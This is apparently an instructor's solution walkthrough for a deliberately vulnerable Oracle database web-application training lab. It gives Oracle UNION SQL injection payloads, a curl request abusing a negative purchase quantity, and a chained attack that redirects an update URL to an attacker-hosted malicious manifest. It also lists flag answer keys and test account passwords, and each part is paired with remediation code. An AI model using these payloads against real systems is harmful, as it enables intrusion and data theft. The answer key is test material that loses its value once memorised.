# 🔐 Solution Guide & Walkthrough – OracleSecLab
## Vulnerable Oracle Database Web Application Lab

> ⚠️ **CONFIDENTIAL INSTRUCTOR & EVALUATOR GUIDE:**  
> This document contains official exploitation walkthroughs, cryptographic assembly routines, and solution keys for the OracleSecLab training environment.

---

## 🚩 Flag Master List

| Challenge | Target Vulnerability | Official Flag Value | Endpoint / Origin |
|:---:|:---|:---|:---|
| **Flag 1** | Oracle UNION SQL Injection | `DBS401{SQL_1nj3ct10n_0r4cl3!}` | `search.php` (Fragmented: `FLAGS`, `AUDIT_LOGS`, `CONFIG_STORE`) |
| **Flag 2** | Insecure Business Logic (Negative Qty) | `DBS401{LOGIC_GURU_2024}` | `store.php` (Exam Leak Item, > 999,999 Credits) |
| **Flag 3** | Access Control & Supply Chain Poisoning | `DBS401{5upp1y_Ch41n_P0150n1ng_0912}` | `partner_config.php` + `admin.php?check_updates=1` |

---

## 🎭 Decoy & Honeypot Flag Matrix

To challenge automated vulnerability scanners and enforce deep analytical reasoning, multiple honeypots are seeded across the database:

| Decoy Flag | Storage Location | Honeypot Objective |
|:---|:---|:---|
| `DBS401{FAKE_union_select_lol}` | `FAKE_FLAGS` table | Traps naive automated scanner UNION payloads |
| `DBS401{FAKE_IDOR_wrong_student}` | `FAKE_FLAGS` table & unlinked enrollment | Traps candidates brute-forcing arbitrary student IDs |
| `DBS401{FAKE_blind_wrong_key_xd}` | `ADMIN_SECRETS` (`key=oracle_flag_3_backup`) | Traps candidates attempting Blind SQLi on `secret_check.php` |
| `DBS401{FAKE_archived_flag_123}` | `FLAG_ARCHIVE` table | Traps players querying obvious-looking table names |
| Base64 Garbage String | `FLAGS` (`flag_code=FL_DECOY_B`) | Misleading active row in the primary flags table |
| Base64 Garbage String | `CONFIG_STORE` (`config_key=sys_beta_marker`) | Misleading companion key in configuration storage |

---

## ═══════════════════════════════════════════════
## VULNERABILITY 1 – Oracle UNION-Based SQL Injection
## ═══════════════════════════════════════════════

* **Vulnerability Difficulty:** Easy (Direct input concatenation)
* **Flag Extraction Complexity:** Very Hard (Fragmented across 3 tables with 3 different encodings)
* **Vulnerable Endpoint:** `GET /dbs401-oracle-app/search.php?q=KEYWORD`
* **Authentication Required:** Any authenticated account (`student1`, `teacher1`, `admin`)

---

### Step 1 – Confirming the Injection Point

Send single-quote test characters to observe server handling:
```http
GET /search.php?q=' HTTP/1.1
```
* **Response:** Returns `"Search failed. Please check your input."` (Database exceptions are caught, but indicate syntax failure).

Verify boolean reflection:
```http
GET /search.php?q=Software' AND '1'='1 HTTP/1.1
```
* **Response:** Returns valid student results matching `"Software"`.

```http
GET /search.php?q=Software' AND '1'='2 HTTP/1.1
```
* **Response:** Returns zero results. Boolean condition is reflected in SQL execution.

---

### Step 2 – Determining Column Count & Types

Oracle requires strict data-type alignment in `UNION SELECT` operations and requires a table reference (typically `FROM DUAL`).

Test column count using `NULL` placeholders:
```sql
' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1
```
* Three `NULL` values return without error, establishing that the underlying query selects exactly **3 columns**.

Determine column data types:
```sql
' UNION SELECT 1,'test',NULL FROM DUAL WHERE '1'='1
```
* Returns valid row:
  * Column 1: `NUMBER` (maps to `student_id`)
  * Column 2: `VARCHAR2` (maps to `full_name`)
  * Column 3: `VARCHAR2` (maps to `major`)

---

### Step 3 – Oracle Metadata Enumeration

Extract the current database schema user:
```sql
' UNION SELECT 1,USER,NULL FROM DUAL WHERE '1'='1
```
* **Result:** `DBS401_USER`

Enumerate application tables using `USER_TABLES` and `ROWNUM`:
```sql
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1
```
* **Discovered Tables:** `USERS`, `STUDENTS`, `COURSES`, `ENROLLMENTS`, `AUDIT_LOGS`

Filter known tables using `NOT IN` to locate sensitive tables:
```sql
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES 
WHERE table_name NOT IN ('USERS','STUDENTS','COURSES','ENROLLMENTS','AUDIT_LOGS')
  AND ROWNUM<=5 AND '1'='1
```
* **Discovered Tables:** `FLAGS`, `ADMIN_SECRETS`, `CONFIG_STORE`, `FAKE_FLAGS`, `SYSTEM_HINTS`, `FLAG_ARCHIVE`

> ⚠️ `FLAG_ARCHIVE` contains fake flag `DBS401{FAKE_archived_flag_123}`. Genuine flag fragments reside across `FLAGS`, `AUDIT_LOGS`, and `CONFIG_STORE`.

---

### Step 4 – Extracting Flag Part A from `FLAGS` (Hex Encoded)

```sql
' UNION SELECT 1,flag_part,flag_code FROM FLAGS WHERE flag_code='FL1_PART_A' AND is_active=1 AND ROWNUM=1 AND '1'='1
```
* **Raw Value:** `4442533430317B53514C5F`
* **Decoding (Hex to ASCII):**  
  `4442533430317B53514C5F` → **`DBS401{SQL_`**

---

### Step 5 – Extracting Flag Part B from `AUDIT_LOGS` (Reversed String)

```sql
' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS WHERE action='SYSTEM_AUDIT_CHECK' AND ROWNUM=1 AND '1'='1
```
* **Raw JSON String:**
  ```json
  {"sys_version":"v2.1","fragment":"_n01tc3jn1","note":"reverse_for_context","checksum":"a9f2"}
  ```
* **Decoding (String Reversal):**  
  `_n01tc3jn1` → **`1nj3ct10n_`**

---

### Step 6 – Extracting Flag Part C from `CONFIG_STORE` (Base64 Encoded)

```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE WHERE config_key='sys_alpha_marker' AND '1'='1
```
* **Raw Value:** `MHI0Y2wzIX0=`
* **Decoding (Base64 Decode):**  
  `MHI0Y2wzIX0=` → **`0r4cl3!}`**

---

### Step 7 – Assembling Flag 1

```
Part A (Hex Decode):    DBS401{SQL_
Part B (Reversed):      1nj3ct10n_
Part C (Base64 Decode): 0r4cl3!}
─────────────────────────────────────────────
FLAG 1:                 DBS401{SQL_1nj3ct10n_0r4cl3!}
```

✅ **Official Flag 1:** `DBS401{SQL_1nj3ct10n_0r4cl3!}`

---

### Remediation & Patch

```php
// Vulnerable Implementation (Direct Concatenation):
$sql = "SELECT student_id, full_name, major FROM STUDENTS WHERE LOWER(full_name) LIKE '%" . $keyword . "%'";

// Secure Implementation (Parameterized Query with Bind Variables):
$param = '%' . strtolower($keyword) . '%';
$sql   = "SELECT student_id, full_name, major FROM STUDENTS WHERE LOWER(full_name) LIKE :kw";
$stmt  = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':kw', $param);
oci_execute($stmt);
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 2 – Insecure Business Logic (Negative Quantity)
## ═══════════════════════════════════════════════

* **Vulnerability Difficulty:** Hard (Input boundary manipulation)
* **Flag Extraction Complexity:** Very Hard (Threshold unlock mechanism)
* **Vulnerable Endpoint:** `POST /dbs401-oracle-app/store.php`
* **Authentication Required:** Any student account (`student1`, `student2`, `student3`)

---

### Step 1 – Analyzing the Business Constraint

1. Authenticate as `student1` (`Student@123`).
2. Navigate to the Material Store at `store.php`.
3. Note current student balance: **150 Credits**.
4. The restricted item **"Exam Leak 2024 (CLASSIFIED)"** costs **999,999 Credits**. Direct purchase attempts are rejected with insufficient credit warnings.

---

### Step 2 – Exploiting the Arithmetic Inversion

In `store.php`, the server validates that the student possesses sufficient credits for the purchase (`$credits >= $cost`), but fails to ensure that `$quantity > 0`:

$$\text{cost} = \text{quantity} \times \text{unit\_price}$$
$$\text{new\_credits} = \text{current\_credits} - \text{cost}$$

If a negative quantity is supplied:
$$\text{cost} = -20{,}000 \times 100 = -2{,}000{,}000$$
$$\text{new\_credits} = 150 - (-2{,}000{,}000) = 2{,}000{,}150$$

Submit the manipulated request:
```bash
curl -s -X POST "http://127.0.0.1/dbs401-oracle-app/store.php" \
     -b "DBS401_SESSION=<COOKIE_VALUE>" \
     -d "buy=1&quantity=-20000"
```

* **Server Response:** `"Purchase successful! 2,000,000 credits added back to your balance."`
* Student credits now exceed **2,000,000 Credits**.

---

### Step 3 – Unlocking Flag 2

With a credit balance exceeding 999,999:
1. Reload `store.php`.
2. The card for **"Exam Leak 2024 (CLASSIFIED)"** automatically transitions to unlocked state, revealing Flag 2:

```html
<div class="alert alert-success">
  <strong>CLASSIFIED MATERIAL UNLOCKED:</strong><br>
  <code>DBS401{LOGIC_GURU_2024}</code>
</div>
```

✅ **Official Flag 2:** `DBS401{LOGIC_GURU_2024}`

---

### Remediation & Patch

```php
// Vulnerable Implementation:
$cost = $qty * $price;
if ($credits >= $cost) {
    $newCredits = $credits - $cost;
    // ...
}

// Secure Implementation (Strict Server-Side Positive Boundary):
if ($qty <= 0 || $qty > 100) {
    $msg = "Invalid purchase quantity. Quantity must be between 1 and 100.";
} elseif ($credits < $cost) {
    $msg = "Insufficient credits for this transaction.";
} else {
    $newCredits = $credits - $cost;
    // ...
}
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 3 – Supply Chain Poisoning via Broken Access Control
## ═══════════════════════════════════════════════

* **Vulnerability Difficulty:** Hard (Multi-step chained exploit)
* **Flag Extraction Complexity:** Very Hard (External rogue server + cryptographic half-flag assembly)
* **Reconnaissance Endpoint:** `search.php?q=...`
* **Configuration Endpoint:** `partner_config.php` (Broken Access Control)
* **Execution Trigger:** `admin.php?check_updates=1`
* **Authentication Required:** `student1` (to poison configuration); `admin` (to trigger execution).

---

### Step 1 – Reconnaissance via SQL Injection

Utilize the SQL injection in `search.php` to inspect the `CONFIG_STORE` table:

```sql
' UNION SELECT 1,config_key,config_value FROM CONFIG_STORE WHERE config_key IN ('update_url','app_version') AND '1'='1
```

* **Discovered Configuration:**
  * `update_url`: `http://127.0.0.1:8081/manifest.json`
  * `app_version`: `3.1.0`

**Deduction:** When an administrator triggers an update check, the application performs a remote HTTP request to `update_url`. If the manifest reports a version higher than `3.1.0`, it processes the partner update payload.

---

### Step 2 – Identifying Broken Access Control in `partner_config.php`

Although `partner_config.php` is omitted from student navigation menus, the script is directly accessible to any authenticated session. The script displays an "ADMINISTRATOR ONLY" warning banner, but **fails to enforce** `$_SESSION['role'] === 'admin'` prior to handling POST requests.

As a result, regular students can overwrite `CONFIG_STORE.update_url`.

---

### Step 3 – Hosting the Malicious Partner Manifest

The exploit requires an external HTTP server serving a poisoned `manifest.json`. The manifest must supply the **first hex half** of Flag 3, which `admin.php` will combine with its server-side secret suffix `FLAG3_LOCAL_HEX_SUFFIX`.

Create the malicious manifest on the attacker host:
```bash
mkdir -p /tmp/fake_partner
cat > /tmp/fake_partner/manifest.json << 'EOF'
{
  "version": "9.9.9",
  "status": "critical_security_patch",
  "checksum": "3b7f89c0de44",
  "flag_part": "4442533430317b3575707031795f436834"
}
EOF

# Start lightweight HTTP listener on port 8081
cd /tmp/fake_partner
python3 -m http.server 8081 --bind 0.0.0.0
```

---

### Step 4 – Poisoning `update_url` via `partner_config.php`

Authenticate as `student1` and submit a POST request to update the manifest URL:

```bash
curl -s -X POST "http://127.0.0.1/dbs401-oracle-app/partner_config.php" \
     -b "DBS401_SESSION=<STUDENT_COOKIE>" \
     -d "manifest_url=http://127.0.0.1:8081/manifest.json"
```

* **Server Response:** `"Partner manifest URL updated successfully."`

---

### Step 5 – Triggering Update Processing as Administrator

Authenticate as `admin` (`Admin@DBS401!2024`) and trigger the update mechanism:

```bash
curl -s "http://127.0.0.1/dbs401-oracle-app/admin.php?check_updates=1" \
     -b "DBS401_SESSION=<ADMIN_COOKIE>"
```

**Internal Server Execution Flow:**
1. `admin.php` queries `CONFIG_STORE.update_url`.
2. Server issues HTTP GET request to `http://127.0.0.1:8081/manifest.json`.
3. Verifies that `manifest.version` (`9.9.9`) > `APP_VERSION` (`3.1.0`).
4. Reads `manifest.flag_part` (`4442533430317b3575707031795f436834`).
5. Concatenates with server-side constant `FLAG3_LOCAL_HEX_SUFFIX`:
   `316e5f50303135306e316e675f303931327d`
6. Decodes complete hex string via `hex2bin()`.
7. Renders the decoded plaintext flag on the administrator interface.

---

### Step 6 – Assembling Flag 3

```
Manifest Hex Part:     4442533430317b3575707031795f436834
Server-Side Suffix:    316e5f50303135306e316e675f303931327d
────────────────────────────────────────────────────────────────────────
Full Hex String:       4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d
Hex Decoded:           DBS401{5upp1y_Ch41n_P0150n1ng_0912}
```

✅ **Official Flag 3:** `DBS401{5upp1y_Ch41n_P0150n1ng_0912}`

---

### Remediation & Patch

1. **Enforce Role-Based Access Control:** Restrict `partner_config.php` strictly to `admin` role sessions.
2. **Implement Destination Allowlist:** Validate update URLs against an approved enterprise CDN whitelist.
3. **Verify Cryptographic Signatures:** Require digital signatures (e.g. RSA-SHA256 or HMAC) on update manifests prior to parsing.

```php
// Enforce strict administrative authorization:
if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
    http_response_code(403);
    die("Access Denied: Administrative privileges required.");
}

// Enforce trusted origin allowlist:
$allowedManifestDomains = [
    'https://updates.fpt-portal.edu.vn/manifest.json',
    'https://cdn.oracle-sec-lab.internal/manifest.json'
];

if (!in_array($inputUrl, $allowedManifestDomains, true)) {
    die("Validation Error: Manifest URL origin is not in the approved repository allowlist.");
}
```

---

## 📸 Demonstration Evidence Checklist

| Item | Expected Demonstration Artifact |
|:---:|:---|
| **1** | `search.php` SQL error suppression and boolean reflection (`' AND '1'='1`). |
| **2** | `search.php` column count determination using `UNION SELECT NULL,NULL,NULL FROM DUAL`. |
| **3** | `USER_TABLES` enumeration revealing `FLAGS`, `AUDIT_LOGS`, and `CONFIG_STORE`. |
| **4** | Extraction of Flag 1 Part A from `FLAGS` (hex encoded). |
| **5** | Extraction of Flag 1 Part B from `AUDIT_LOGS` (reversed string). |
| **6** | Extraction of Flag 1 Part C from `CONFIG_STORE` (base64 encoded). |
| **7** | Execution of `python3 tools/decode_helper.py --assemble` producing complete Flag 1. |
| **8** | Initial `store.php` view displaying standard credit balance (150 Credits). |
| **9** | Submission of negative quantity (`-20,000`) and resultant balance increase (~2,000,000 Credits). |
| **10** | Unlocked "Exam Leak 2024" card revealing Flag 2. |
| **11** | Reconnaissance query extracting `update_url` and `app_version` from `CONFIG_STORE`. |
| **12** | Direct access to `partner_config.php` via standard `student1` session. |
| **13** | Successful redirection of `update_url` to attacker HTTP server on port 8081. |
| **14** | Triggering `admin.php?check_updates=1` resulting in complete Flag 3 disclosure. |
| **15** | Demonstration of hardened defense mechanisms in `secure_versions/`. |

---

## 🔑 Pre-configured Test Accounts

| Username | Password | Assigned Role | Capabilities |
|:---|:---|:---:|:---|
| `admin` | `Admin@DBS401!2024` | **Admin** | System management, user CRUD, update trigger |
| `teacher1` | `Teacher@123` | **Teacher** | Faculty grading portal, student search |
| `student1` | `Student@123` | **Student** | Enrolled student (150 credits), store & course registration |
| `student2` | `Student@123` | **Student** | Enrolled student (50 credits) |
| `student3` | `Student@123` | **Student** | Enrolled student (200 credits) |

---

*OracleSecLab – Educational Penetration Testing Lab – Confidential Master Solution Key.*